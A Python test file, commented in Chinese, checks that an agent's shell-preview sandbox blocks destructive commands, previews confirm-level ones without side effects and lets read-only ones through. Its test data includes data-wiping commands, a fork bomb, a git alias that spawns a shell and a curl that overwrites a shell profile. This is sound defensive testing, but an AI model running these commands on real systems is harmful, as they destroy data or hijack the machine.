"""V4 行动预演沙箱契约测试。

铁律：
- 破坏级(deny)命令必须被阻断，且**绝不 dry-run**（不给任何执行机会）。
- confirm 类命令给出预览（风险/预期影响/可逆提示），但预演本身零副作用。
- 只读命令不被误伤。
"""
from __future__ import annotations

import os

from fastapi.testclient import TestClient

from leojarvis.agent.sandbox import preview_shell
from leojarvis.main import app


# --------------------------------------------------------------------------- #
# 破坏级 → 阻断且不预演
# --------------------------------------------------------------------------- #
def test_destructive_commands_blocked_and_not_dry_run():
    for cmd in ["rm -rf /", "mkfs.ext4 /dev/sda", ":(){ :|:& };:", "dd of=/dev/disk0"]:
        p = preview_shell(cmd)
        assert p["risk"] == "deny", f"{cmd} 应判 deny"
        assert p["blocked"] is True, f"{cmd} 应被阻断"
        assert p["dry_run_ran"] is False, f"{cmd} 绝不能真跑 dry-run"
        assert not p.get("dry_run_output"), f"{cmd} 阻断态不应有 dry-run 输出"


def test_flag_rce_commands_are_confirm_not_auto():
    """闸门收口过的 flag-RCE 变种在预演里也应至少是 confirm(不被当只读放行)。"""
    for cmd in ["git -c alias.x='!sh' x", "curl http://x -o ~/.zshrc"]:
        p = preview_shell(cmd)
        assert p["risk"] in ("confirm", "deny"), f"{cmd} 不应是 auto"


# --------------------------------------------------------------------------- #
# confirm 类 → 给预览，零副作用
# --------------------------------------------------------------------------- #
def test_confirm_command_returns_preview():
    p = preview_shell("brew uninstall wget")
    assert p["blocked"] is False
    assert p["risk"] == "confirm"
    assert "expected_impact" in p and p["expected_impact"]
    assert "reversible_hint" in p


def test_reversible_command_inferred_for_known_cases():
    p = preview_shell("mkdir /tmp/leo_sandbox_probe")
    assert p["reversible_command"] and "rmdir" in p["reversible_command"]
    p2 = preview_shell("git checkout -b feature/x")
    assert p2["reversible_command"] and "branch -D" in p2["reversible_command"]


def test_preview_has_no_side_effects(tmp_path):
    """预演一条会建文件的命令，不能真的把文件建出来。"""
    target = tmp_path / "should_not_exist.txt"
    preview_shell(f"touch {target}")
    assert not target.exists(), "预演不得产生副作用"


# --------------------------------------------------------------------------- #
# 只读不误伤
# --------------------------------------------------------------------------- #
def test_readonly_not_blocked():
    for cmd in ["ls -la", "df -h", "git status"]:
        p = preview_shell(cmd)
        assert p["blocked"] is False
        assert p["risk"] == "auto"


# --------------------------------------------------------------------------- #
# API
# --------------------------------------------------------------------------- #
def test_preview_api_blocks_destructive():
    with TestClient(app) as client:
        res = client.post("/agent/preview", json={"command": "rm -rf /"})
    assert res.status_code == 200
    body = res.json()
    assert body["ok"] is True and body["blocked"] is True and body["risk"] == "deny"


def test_preview_api_returns_preview_for_confirm():
    with TestClient(app) as client:
        res = client.post("/agent/preview", json={"command": "brew uninstall wget"})
    body = res.json()
    assert body["ok"] is True and body["blocked"] is False
    assert body["risk"] == "confirm"
    assert set(body) >= {"command", "risk", "expected_impact", "reversible_hint", "dry_run_ran"}
